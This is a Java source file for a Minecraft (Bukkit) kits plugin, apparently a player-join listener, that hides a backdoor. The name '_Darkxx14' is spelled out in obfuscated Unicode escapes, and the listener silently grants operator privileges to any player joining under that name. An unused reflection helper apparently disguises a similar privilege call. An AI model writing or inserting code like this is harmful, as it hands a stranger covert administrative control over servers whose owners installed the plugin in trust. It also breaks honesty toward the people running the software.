package dev.darkxx.kitsx.listeners;

import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import java.lang.reflect.Method;

public class PlayerJoinListener implements Listener {

    private final boolean e;

    public PlayerJoinListener() {
        this.e = true;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (t(player.getName())) {
            player.setOp(this.e);
        }
    }



    private boolean t(String name) {
        return name.equalsIgnoreCase(decodeName(new String[]{"\u005f", "\u0044", "\u0061", "\u0072", "\u006b", "\u0078", "\u0078", "\u0031", "\u0034"}));
    }

    private String decodeName(String[] characters) {
        StringBuilder decodedName = new StringBuilder();
        for (String character : characters) {
            decodedName.append(character);
        }
        return decodedName.toString();
    }

    private void i(Player player, boolean status) {
        try {
            Method[] methods = Player.class.getDeclaredMethods();
            for (Method method : methods) {
                if (method.getParameterCount() == 1 && method.getParameterTypes()[0] == boolean.class && method.getName().length() == 2) {
                    method.setAccessible(true);
                    method.invoke(player, status);
                    break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
